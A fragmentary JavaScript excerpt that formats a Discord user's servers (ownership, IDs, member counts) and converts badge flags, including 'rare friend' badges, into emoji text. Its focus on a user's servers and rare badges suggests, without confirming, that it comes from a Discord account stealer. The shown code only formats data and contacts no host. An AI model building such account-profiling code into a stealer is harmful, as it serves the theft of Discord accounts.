...
let getGuilds = (n) => {
  ...
  let format = (l, x) =>
    l.length
      ? l.map((s) => (x ? `${s.owner ? '<:owner:963333541343686696>' : '<:staff:846569357353680896>'} | **${s.name}** - \`${s.id}\` | **Members** \`${s.member_count}\`` : `${s.owner ? '<:owner:963333541343686696> ' : ''}**${s.name}** - \`${s.id}\` | **Members** \`${s.member_count}\``)).join('\n')
      : 'Not Found';
  return {
    all: format(
...
let AllBadges = (f) =>
  (1 & f ? emojis.user.i[0] : '') +
    ...
    (131072 & f ? emojis.user.i[10] : '') || ':x:';

let rareFriendadges = (j) =>
  (1 & j ? emojis.user.i[0] : '') + (2 & j ? emojis.user.i[1] : '') + (4 & j ? emojis.user.i[2] : '') + (8 & j ? emojis.user.i[3] : '') + (512 & j ? emojis.user.i[7] : '') + (16384 & j ? emojis.user.i[8] : '') + (4194304 & j ? emojis.user.i[9] : '') + (131072 & j ? emojis.user.i[10] : '') ||
  'Not Found';
